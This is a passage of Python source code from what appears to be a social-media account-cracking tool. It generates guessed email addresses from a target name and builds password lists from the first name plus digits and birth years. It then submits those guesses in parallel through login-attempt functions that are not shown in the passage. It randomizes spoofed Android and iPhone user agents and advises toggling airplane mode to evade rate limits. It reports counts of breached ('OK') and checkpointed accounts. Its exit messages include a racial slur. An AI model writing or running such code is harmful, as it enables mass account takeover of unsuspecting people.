	  sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	blk = ['x','1','12','2','234','01','02','112','1122','321','789','3','2468','246','419','4321','gamers','gaming','dev','xyz','baby','fuck','1','123','jesus','777','hacker','666','limited','nigeria','enterprise','sweet','102030','111','001','hot','122','xxx','XXX','xnxx','2023','2022','404','obi','2021','2019','2018','2017','2016','2015','2014','2013','2012','2011','2010','clone']
	global ok , cp
	cetak(nel(f'Enter first and last name of email to begin crack, Example : adachinwa, aishalawal, peterobi, alisonshed',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' ╰─  Enter Target Name: ')
	if ',' in str(nama):
		print(f" ╰─  Enter name without comma")
		time.sleep(3);exit()
	cetak(nel(f'Enter Domain Name , For Example : @Gmail.com, @hotmail.com, @hotmail.co.uk ,@yahoo.com.br, @live.co.uk,  @mail.com,  @Yahoo.com, etc',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' ╰─  Enter Domain Name : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" ╰─  Domain Invalid ")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz , You Can use  Metode Reguler Or Async',width=90,padding=(0,5),style=f"bold white"))
	jumlah = console.input(f' ╰─  Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rr(1945,2023))}',f'{str(rc(blk))}',f'{str(rr(111,999))}',f'{str(rr(0,5000))}',f'{str(rr(1,99))}']
		E = [f'{str(rr(1945,2023))}',f'{str(rc(blk))}',f'{str(rr(1,999))}']
		F = [f'{str(rr(1945,2023))}',f'{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(E))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r ╰─  Collected {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
		
		
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	atsu=[]
	atsu.append(nel(f'\t[white][b magenta] Not Recomended[white]',title='01',subtitle="Old Account",width=38))
	atsu.append(nel(f'\t [b green] Very Recomended[white]',title='02',subtitle="New Account",width=37))
	atsu.append(nel(f'\t [b green] Very Recomended[white]',title='03',subtitle="Account Random",width=37))
	CON.print(col(atsu))
	hu = input(f'  {h}>+<{x} Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Choose Correct Option ')
		exit()
	ats=[]
	ats.append(nel(f'\t[white][b green] OK ONLY 👌💥💓[white]',title='01',subtitle="Mobile V1",width=38))
	ats.append(nel(f'\t [b magenta] Recommended [white]',title='02',subtitle="Mobile V2",width=38))
	ats.append(nel(f'\t [b yellow] OK ONLY 🔥👩‍💻🙏 [white]',title='03',subtitle="Mbasic",width=38))
	ats.append(nel(f'\t [b red] Very Recommended[Fast] [white]',title='04',subtitle="Free",width=38))
	ats.append(nel(f'\t [b blue] Very Recommended 🤧[Fast] [white]',title='05',subtitle="Wick 1",width=38))
	ats.append(nel(f'\t [b pink] Very Recommended 🤓[Fast] [white]',title='06',subtitle="Wick 2",width=38))
	ats.append(nel(f'\t [b purple] Less Data 😍[Fast] [white]',title='07',subtitle="Validate",width=38))
	CON.print(col(ats))
	#print('>> 5. 9thRage  ')
	#print('>> 6. Wick 1  ')
	#print('>> 7. Wick 2 ')
	hc = input(f'  {k}>+< {x} Select : ')
	if hc in ['5','05']:
		method.append('wick1')
	elif hc in ['6','06']:
		method.append('wick2')
	elif hc in ['7','07']:
		method.append('validate')
	elif hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> Select the Correct Option  ')
		setting()
	elif hc in ['2','02']:
		method.append('mobile2')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('free')
	else:
		method.append('mobile')
	_jembot_ = input(f'  Add Application ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> Select the Correct Option  ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('  Add Password Manually ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Enter an additional password of at least 6 characters\n[[cyan]•[white]] Example:[green] brother,123456,123123[white]  '))
		pwku=input('  Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	su()
#-------------------[ BAGIAN-WORDLIST ]------------#
def su():
	prints(nel(f"\t{P2}[{H2}1{P2}].   321name321 + 123name + 12345name [ {K2}SLOW (😩🙏) {P2}]\n\t[{H2}2{P2}].   2020 + 2015 + 2005 [ {M2}SLOW 😘👀{P2}]\n\t[{H2}3{P2}].   123name + name2020 + name12345 [{H2} VERY SLOW (BEST✓💥🔥){P2}]\n\t[{H2}4{P2}].   name123 + name12345 [{H2}VERY FAST 😍😜{P2}]",width=80,style=f"{color_panel}")) 
	ch = input('[•] Choose  : ')
	if ch in ['1','01']:
		passwrd1()
	elif ch in ['2','02']:
		passwrd2()
	elif ch in ['3','03']:
		passwrd3()
	elif ch in ['4','04']:
		passwrd4()
	else:
		passwrd4()
def passwrd1():
	global prog,des
	atu=[]
	atu.append(nel(f'[b green]    {okc}',title="saved in",width=37))
	atu.append(nel(f'[b yellow]    {cpc}',title="saved in",width=38))
	CON.print(col(atu))
	cetak(nel(f'\t            Turn on Airplane Mode Every 10 minutes'))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'12')
						pwv.append(frs+'1122')
						pwv.append(frs+'321')
						pwv.append(frs+'54321')
						pwv.append(frs+'4321')
						pwv.append('123'+frs+'123')
						pwv.append('12'+frs+'12')
						pwv.append('1234'+frs+'1234')
						pwv.append('12345'+frs+'12345')
						pwv.append('123'+frs)
						pwv.append('1234'+frs)
						pwv.append('12345'+frs)
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'12')
						pwv.append(frs+'1122')
						pwv.append(frs+'321')
						pwv.append(frs+'54321')
						pwv.append('123'+frs+'123')
						pwv.append('112'+frs+'112')
						pwv.append('12'+frs+'12')
						pwv.append('1234'+frs+'1234')
						pwv.append('12345'+frs+'12345')
						pwv.append('123'+frs)
						pwv.append('1234'+frs)
						pwv.append('12345'+frs)
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'wick1' in method:
					pool.submit(cracklawakv1,idf,pwv)
				elif 'wick2' in method:
					pool.submit(cracklawakv1,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mobile2' in method:
					pool.submit(crackmobilev2,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'validate' in method:
					pool.submit(crack1,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(nel('\t[cyan]✓[green] Crack Done and Dusted, Dont Forget to Be Thankful[cyan] ✓[white] '))
		print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
		print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
		print('')
		print('>> Continue to Crack Back ( Y/t ) ? ')
		woi = input('>> Select : ')
		if woi in ['y','Y']:
			back()
		else:
			print(f'\t{x}>>{k} Good Bye Nigga{x} << ')
			time.sleep(2)
			exit()

def passwrd2():
	global prog,des
	atu=[]
	atu.append(nel(f'[b green]    {okc}',title="saved in",width=37))
	atu.append(nel(f'[b yellow]    {cpc}',title="saved in",width=38))
	CON.print(col(atu))
	cetak(nel(f'\t            Turn on Airplane Mode Every 10 minutes'))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'2017')
						pwv.append(frs+'2018')
						pwv.append(frs+'2020')
						pwv.append(frs+'2007')
						pwv.append(frs+'2010')
						pwv.append(frs+'2000')
						pwv.append(frs+'2008')
						pwv.append(frs+'2011')
						pwv.append(frs+'2012')
						pwv.append(frs+'2013')
						pwv.append(frs+'2014')
						pwv.append(frs+'2016')
						pwv.append(frs+'2025')
						pwv.append(frs+'2050')
						pwv.append(frs+'1945')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'2023')
						pwv.append(frs+'2022')
						pwv.append(frs+'2021')
						pwv.append(frs+'2020')
						pwv.append(frs+'2019')
						pwv.append(frs+'2010')
						pwv.append(frs+'2004')
						pwv.append(frs+'2015')
						pwv.append(frs+'2014')
						pwv.append(frs+'2009')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'mobile5' in method:
					pool.submit(crackwick2,idf,pwv)
				elif 'mobile4' in method:
					pool.submit(crackwick1,idf,pwv)
				elif 'mobile3' in method:
					pool.submit(crackrage,idf,pwv)
				elif 'mobile2' in method:
					pool.submit(crack2,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'regular' in method:
					pool.submit(crackregular,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(nel('\t[cyan]✓[green] Crack Done and Dusted, Dont Forget to Be Thankful[cyan] ✓[white] '))
		print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
		print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
		print('')
		print('>> Continue to Crack Back ( Y/t ) ? ')
		woi = input('>> Select : ')
		if woi in ['y','Y']:
			back()
		else:
			print(f'\t{x}>>{k} Good Bye Nigga{x} << ')
			time.sleep(2)
			exit()

def passwrd3():
	global prog,des
	atu=[]
	atu.append(nel(f'[b green]    {okc}',title="saved in",width=37))
	atu.append(nel(f'[b yellow]    {cpc}',title="saved in",width=38))
	CON.print(col(atu))
	cetak(nel(f'\t            Turn on Airplane Mode Every 10 minutes'))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				#pwv = random.randint(11111111,99999999)
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'12')
						pwv.append(frs+'1122')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'4321')
						pwv.append('123'+frs+'123')
						pwv.append('12'+frs+'12')
						pwv.append('1234'+frs+'1234')
						pwv.append(frs+'1')
						pwv.append(frs+'2')
						pwv.append(frs+'12')
						pwv.append(frs+'112')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'234')
						pwv.append(frs+'122')
						pwv.append(frs+'1212')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'@')
						pwv.append(frs+'@1')
						pwv.append(frs+'@2')
						pwv.append(frs+'@12')
						pwv.append(frs+'@123')
						pwv.append(frs+'@1234')
						pwv.append(frs+'@12345')
						pwv.append(frs+'2023')
						pwv.append(frs+'2022')
						pwv.append(frs+'2021')
						pwv.append(frs+'2020')
						pwv.append(frs+'2019')
						pwv.append(frs+'2010')
						pwv.append(frs+'2004')
						pwv.append(frs+'2015')
						pwv.append(frs+'2014')
						pwv.append(frs+'2009')
						pwv.append(frs+'2017')
						pwv.append(frs+'2018')
						pwv.append(frs+'2020')
						pwv.append(frs+'2007')
						pwv.append(frs+'2010')
						pwv.append(frs+'2000')
						pwv.append(frs+'2008')
						pwv.append(frs+'2011')
						pwv.append(frs+'2012')
						pwv.append(frs+'2013')
						pwv.append(frs+'2014')
						pwv.append(frs+'2016')
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'mobile5' in method:
					pool.submit(crackwick2,idf,pwv)
				elif 'mobile4' in method:
					pool.submit(crackwick1,idf,pwv)
				elif 'mobile3' in method:
					pool.submit(crackrage,idf,pwv)
				elif 'mobile2' in method:
					pool.submit(crack2,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'regular' in method:
					pool.submit(crackregular,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(nel('\t[cyan]✓[green] Crack Done and Dusted, Dont Forget to Be Thankful[cyan] ✓[white] '))
		print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
		print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
		print('')
		print('>> Continue to Crack Back ( Y/t ) ? ')
		woi = input('>> Select : ')
		if woi in ['y','Y']:
			back()
		else:
			print(f'\t{x}>>{k} Good Bye Nigga{x} << ')
			time.sleep(2)
			exit()

def passwrd4():
	global prog,des
	atu=[]
	atu.append(nel(f'[b green]    {okc}',title="saved in",width=37))
	atu.append(nel(f'[b yellow]    {cpc}',title="saved in",width=38))
	CON.print(col(atu))
	cetak(nel(f'\t            Turn on Airplane Mode Every 10 minutes'))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'1')
						pwv.append(frs+'2')
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'mobile5' in method:
					pool.submit(crackwick2,idf,pwv)
				elif 'mobile4' in method:
					pool.submit(crackwick1,idf,pwv)
				elif 'mobile3' in method:
					pool.submit(crackrage,idf,pwv)
				elif 'mobile2' in method:
					pool.submit(crack2,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'regular' in method:
					pool.submit(crackregular,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak(nel('\t[cyan]✓[green] Crack Done and Dusted, Dont Forget to Be Thankful[cyan] ✓[white] '))
		print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
		print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
		print('')
		print('>> Continue to Crack Back ( Y/t ) ? ')
		woi = input('>> Select : ')
		if woi in ['y','Y']:
			back()
		else:
			print(f'\t{x}>>{k} Good Bye Nigga{x} << ')
			time.sleep(2)
			exit()
def useragent():
	android_version = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'8.0.0','8','9','10','11','12','13'])
	device_model = random.choice([
		'Mi 9T Pro Build/QKQ1.190825.002; wv',
		'DRA-LX5 Build/HONORDRA-LX5',
		'ZTE Blade A31 Plus Build/RP1A.201005.001',
		'Nokia C10 Build/RP1A.201005.001',
		'COSMO_L707 Build/NRD90M',
		'itel A16 Plus Build/OPM2.171019.012',
		'Impress_Pear Build/NRD90M',
		'STF-L09 Build/HUAWEISTF-L09',
		'itel W5006X Build/QP1A.190711.020',
		'INOI 2 Lite 2021 Build/QP1A.190711.020',
		'POT-LX1 Build/HUAWEIPOT-LX1',
		'JNY-LX1 Build/HUAWEIJNY-L21; wv',
		'itel W6004 Build/PPR1.180610.011',
		'DRA-LX5 Build/HONORDRA-LX5',
		'S10_ROW Build/QP1A.190711.020',
		'Plane_1550S_3G_PS1163MG',
		'HP 250 G6 Notebook PC',
		'Twist 4 Build/QP1A.190711.020',
		'Plane_1523_3G_PS1135MG',
		'X95 Build/QP1A.190711.020',
		'Infinix X690 Build/QP1A.190711.020',
		'TECNO B1f Build/O11019',
		'itel A16 Plus RU Build/OPM2.171019.012',
		'A8 Build/QP1A.190711.020',
		'RMX2170 Build/RKQ1.200903.002',
		'RC10T3G21 Build/QP1A.190711.020',
		'itel L6502 Build/QP1A.190711.020',
		'CP3320AS2 Build/CP3320AS2.211124.0S',
		'5033D_EEA Build/O11019',
		'W-K560-EEA Build/QP1A.190711.020',
		'CPH2239 Build/QP1A.190711.020',
		'KFKAWI Build/PS7323.2829N',
		'TECNO PR651 Build/RP1A.201005.001',
		'HTC One E9s dual sim',
		'TECNO KD6 Build/QP1A.190711.020',
		'SM-J260G Build/M1AJB',
		'Note 10 Build/RP1A.201005.001',
		'V2125 Build/SP1A.210812.003',
		'MotoE2(4G-LTE)',
		'OBASMART_3 Build/V19_20210813',
		'TECNO PR651H Build/RP1A.201005.001',
		'L211-EEA Build/P50-EEA',
		'W-K560-EEA Build/QP1A.190711.020',
		'Pixel 2 XL Build/RP1A.201005.004.A1',
		'Model-X2 Build/PPR1.180610.011',
		'ZTE Blade L130 Build/PPR1.180610.011',
		'LG-X220 Build/LMY47I',
		'BQ-5528L Build/PPR1.180610.011',
		'ASUS_X008D Build/NRD90M',
		'ZB633KL Build/WW_Phone-202008201135',
		'Lenovo L38041 Build/OPM1.171019.019',
		'SM-G960F Build/PPR1.180610.011; wv',
		'HRY-AL00a Build/HONORHRY-AL00a; wv',
		'SM-A315G Build/QP1A.190711.020; wv',
		'Nokia 7 plus Build/QKQ1.190828.002; wv',
		'SM-M526B Build/SP1A.210812.016',
		'POCO M2 Pro Build/RKQ1.200826.002',
		'BUZZ 2 Build/PPR1.180610.011',
		'Micromax Q402+ Build/NRD90M',
		'Pixel 2 XL Build/OPD1.170816.004',
		'SM-G975F Build/QP1A.190711.020; wv',
		'JAT-L41 Build/HUAWEIJAT-L41; wv',
		'SM-A530F Build/PPR1.180610.011; wv',
		'XIAOMI MI MAX 2 Build/NMF26F)',
		'Infinix X680B Build/QP1A.190711.020; wv',
		'SM-A600FN Build/R16NW',
		'HUAWEI LUA-U03',
		'vivo Y71A Build/OPM1.171019.011; wv',
		'5033D_EEA Build/O11019',
		'Redmi Note 8 Build/RKQ1.201004.002',
		'ASUS_X008D Build/NRD90M',
		'SM-J3308 Build/NMF26X',
		'M8_4G Build/V4_20211102',
		'itel A23 Build/OPM2.171019.012',
		'vivo X20A Build/NMF26X; wv',
		'BKK-AL10 Build/HONORBKK-AL10; wv',
		'Alba 57 Build/O11019',
		'RMX3231 Build/RP1A.201005.001',
		'Redmi Go Build/OPM1.171019.026',
		'SM-A515U1 Build/RP1A.200720.012; wv',
		'PRA-LX1 Build/HONORPRA-LX1; wv',
		'C5L Build/RP1A.201005.001',
		'MI 6 Build/OPR1.170623.027; wv',
		'Micromax Q306 Build/O11019',
		'Nokia 2.1 Build/QKQ1.190828.002',
		'A507DL Build/QP1A.190711.02',
		'TECNO CD6j Build/QP1A.190711.020',
		'AUM-L41 Build/HONORAUM-L41',
		'Redmi S2 Build/OPM1.171019.011',
		'Pixel 3 XL Build/PQ2A.190405.003',
		'TECNO LD7 Build/QP1A.190711.020)',
		'moto g(8) power Build/QPES30.79-124-9',
		'RMX1941 Build/PPR1.180610.011; wv',
		'RMX2111 Build/RP1A.200720.011; wv',
		'W-K560-EEA Build/QP1A.190711.020',
		'Redmi Note 8T Build/PKQ1.190616.001; wv',
		'Decade 53 Build/PPR1.180610.011',
		'moto e5 play Build/OPG28.54-53-8',
		'SM-G960F Build/PPR1.180610.011; wv',
		'moto e(7i) power Build/QOJS30.506-7-7',
		'moto g(7) Build/QPUS30.52-16-2-2; wv',
		'Mi A1 Build/QQ3A.200805.001',
		'Redmi 4A Build/N2G47H',
		'Redmi Note 5A Build/N2G47H',
		'Redmi 5A Build/N2G47H',
		'LG-UK495 Build/MRA58K; wv',
		'OUJIA 2018-S10MAX Build/MRA58K; wv',
		'Infinix X6511B Build/RP1A.201005.001',
		'vivo 1817 Build/OPM1.171019.026; wv',
		'vivo 1817 Build/OPM1.171019.026',
		'msm8953 for arm64',
		'Compaq Presario C700 Notebook PC',
		'Moto C Build/NRD90M.067',
		'Smartway_T1 Build/OPM2.171019.012',
		'myT8 Build/QP1A.190711.020',
		'Lenovo TB-8704X Build/NMF26F',
		'Dell System Vostro 3450',
		'Linx Base 4G LT5052ML',
		'Andromax B16C2G Build/LMY47V; wv',
		'SM-A127F Build/RP1A.200720.012; wv',
		'KFONWI Build/PS7323.2834N',
		'SM-J106F Build/MMB29Q',
		'moto e5 play Build/OPGS28.54-53-8-20',
		'DLI-TL20 Build/HONORDLI-TL20',
		'TECNO KE5 Build/QP1A.190711.020; wv',
		'Redmi Note 4 Build/NRD90M',
		'moto e20 Build/RON31.267-12',
		'X3 Build/RP1A.201005.001',
		'Nexus 5 Build/MRA58N',
		'SM-A750FN Build/PPR1.180610.011',
		'M50 STAR Build/NRD90M; wv',
		'SM-N950F Build/PPR1.180610.011; wv',
		'Impress_Action Build/NMF26F',
		'iCherry_C258 Build/iCherryC258; wv',
		'A80 Build/QP1A.190711.020',
		'C6 2020 Build/QP1A.190711.020',
		'VFD 620 Build/O11019',
		'itel A16 Plus RU Build/OPM2.171019.012',
		'moto g(8) power lite Build/QODS30.163-7-32',
		'Micromax Q402+ Build/NRD90M',
		'BQ-5745L Build/QP1A.190711.020',
		'UGOOS-AM6 Build/PPR1.180610.011',
		'MIX Lite Build/NRD90M',
		'PRO6084FPGE01 Build/O11019',
		'TECNO CB7 Build/PPR1.180610.011',
		'TAB-101 Build/MMB29M',
		'Infinix X682C Build/QP1A.190711.020',
		'CPN-L09 Build/HUAWEICPN-L09',
		'iCherry C251 Build/MRA58K; wv',
		'iCherry C255 Build/MRA58K; wv',
		'C256 Build/iCherry-C256-T03-20180208; wv'
		])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36'
	return ua

def useragentt():
	sambro = str(random.randint(1,100))+'.'+str(random.randint(0,9))
	android_version = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'8.0.0','8','9','10','11','12','13','14'])
	device_model = random.choice(['RMO-NX1','SHARK PAR-H0','SAMSUNG SM-G736U1','SAMSUNG SM-G736U1','Infinix X655F','Nokia 8 V 5G UW','T790Y','T810S','RMX2202','CPH1983','SAMSUNG SM-G935L Build/NRD90M','SAMSUNG SM-E5260','SAMSUNG SM-A826S','Lenovo L19041','CPH2401','SAMSUNG SM-M336K/KSU3AVI3','BV8800','SAMSUNG SM-M017F','Z6252CA','SC-51B','V2044','SAMSUNG SM-J700P','KAZ-N20','BV9800','BV6600E'])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{sambro} Chrome/{chrome_version} Mobile Safari/537.36'
	return ua


def iphone():
	rr = random.randint
	rc = random.choice
	i1=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(13,16))}.{str(rr(0,9))} Mobile/15E148 Safari/604.1"
	i2=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(13,16))}.{str(rr(0,9))} Mobile/15E148 Safari/604.1"
	i3=f"Mozilla/5.0 (Macintosh; Intel Mac OS X {str(rr(4,16))}_{str(rr(0,15))}_{str(rr(0,15))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
	i4=f"Mozilla/5.0 (iPad; CPU OS {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(13,16))}.{str(rr(0,9))}.{str(rr(1,15))} Mobile/15E148 Safari/604.1"
	i5=f"Mozilla/5.0 (Macintosh; Intel Mac OS X {str(rr(4,16))}_{str(rr(0,15))}) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/{str(rr(13,16))}.{str(rr(0,9))} Safari/602.1.50"
	i6=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(rr(13,16))}.{str(rr(0,9))}.{str(rr(0,9))} Mobile/15E148 Safari/604.1"
	i8=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 CriOS/{str(rr(73,110))}.0.{str(rr(2000,6000))}.{str(rr(1,230))} Mobile/15E148 Safari/604.1"
	i9=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/605.1.15 BingSapphire/1.0.400816014"
	i10=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/{str(rr(73,110))}.0.{str(rr(2000,6000))}.{str(rr(1,230))} Version/14.0 Mobile/15E148 Safari/604.1"
	i11=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/22.9.0.2190.10 SA/3 Mobile/15E148 Safari/604.1"
	i12=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/22.9.1.586.10 YaApp_iOS/129.00 YaApp_iOS_Browser/129.00 Safari/604.1 SA/3"
	i13=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X) AppleWebKit/609.22 (KHTML, like Gecko) Version/12.1 Mobile/CLCLDS Safari/609.22"
